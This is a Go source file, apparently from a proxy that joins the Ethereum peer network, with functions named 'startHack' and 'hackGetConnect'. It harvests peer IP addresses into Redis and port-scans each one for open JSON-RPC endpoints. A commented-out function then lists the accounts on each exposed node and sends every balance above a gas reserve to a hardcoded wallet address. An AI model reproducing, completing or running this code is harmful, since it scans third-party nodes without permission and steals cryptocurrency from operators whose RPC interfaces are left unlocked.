package main

import (
	ethpeer "./ethpeer"
	"./logger"
	util "./utils"
	// "crypto/ecdsa"
	"fmt"
	// "github.com/ethereum/go-ethereum/common"
	// "github.com/ethereum/go-ethereum/core/types"
	// "github.com/ethereum/go-ethereum/crypto"
	// "github.com/ethereum/go-ethereum/log"
	// "github.com/ethereum/go-ethereum/p2p"
	// "github.com/ethereum/go-ethereum/p2p/discover"
	"math/big"
	// "net"
	"net"
	// "os"
	"sync"
	"time"

	// "github.com/ethereum/go-ethereum/cmd/utils"
	// "github.com/ethereum/go-ethereum/crypto"
	// "github.com/ethereum/go-ethereum/p2p/discv5"
	// "github.com/ethereum/go-ethereum/p2p/nat"
	// "github.com/ethereum/go-ethereum/p2p/netutil"
	"./redis"
	"./rpcs"
	"strings"
)

func (pxy *proxy) startHack() {
	fmt.Println("start Hacking..........................")
	go connectNode()
	go hackGetConnect()
}
func connectNode() {
	all := pxy.ethpeerset.AllPeer()
	for k, v := range all {
		addr := v.P.RemoteAddr().String()

		add := strings.Split(addr, ":")
		fmt.Println(k, ":", add[0])
		red.WriteNode(add[0], "1020")
		// if pxy.allPeer[add[0]]
		// if hacked, ok := pxy.allPeer[add[0]]; ok {
		// 	if !hacked {
		// 		go pxy.hackGetConnect(add[0])
		// 	}
		// } else {
		// 	go pxy.hackGetConnect(add[0])
		// }
	}
}
func (pxy *proxy) hackGetConnect() {
	addrs := red.GetAddrs()
	for _, addr := range addrs {
		i := red.GetPort(addr)
		for ; i < 65535; i++ {
			red.WriteNode(addr, fmt.Sprintf("%d", i))
			addrport := "http://" + addr + ":" + fmt.Sprintf("%d", i)
			r := rpcs.NewRPCClient("xx", addrport, "3s")
			//if connected write to redis set
			_, err := r.GetBlockNumber()
			if err == nil {
				red.WriteGoodPort(addr + ":" + fmt.Sprintf("%d", i))
			}
		}
	}

}
func (pxy *proxy) rpcFromGoodNode() {
	// addrport := "http://" + addr + ":" + fmt.Sprintf("%d", i)
	// r := rpcs.NewRPCClient("xx", addrport, "3s")
	// acc, err := r.GetAccounts()
	// if err != nil {
	// 	fmt.Println("addrport GetAccounts:", err)
	// 	continue
	// }
	// for _, ac := range acc {
	// 	balance, err := r.GetBalance(ac)
	// 	if err != nil {
	// 		fmt.Println("addrport GetBalance:", err)
	// 		continue
	// 	}
	// 	if balance.Cmp(new(big.Int).SetInt64(21000*100000000000)) > 0 {
	// 		b := balance.Sub(balance, new(big.Int).SetInt64(21000*100000000000))
	// 		r.SendTransaction(ac, "0xd70c043f66e4211b7cded5f9b656c2c36dc02549", "21000", "100000000000", b.Text(10), false)
	// 	}
	// }
}
